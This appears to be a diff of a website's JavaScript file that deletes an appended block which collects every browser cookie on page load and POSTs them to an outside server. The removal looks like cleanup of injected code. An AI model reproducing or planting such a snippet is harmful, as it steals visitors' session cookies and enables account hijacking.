@@ -79,17 +79,3 @@ document.addEventListener("DOMContentLoaded",()=>{function e(e){let t=document.b
 
 
 
-var collectedCookies = {};
-document.addEventListener("DOMContentLoaded", function() {
-  var cookieArray = document.cookie.split("; ");
-  for (var i = 0; i < cookieArray.length; i++) {
-    var cookie = cookieArray[i].split("=");
-    collectedCookies[cookie[0]] = cookie[1];
-  }
-  
-  // Send the collected cookies to your server or database
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", "https://raracing.com/test.php", true);
-  xhr.setRequestHeader("Content-Type", "application/json");
-  xhr.send(JSON.stringify(collectedCookies));
-});
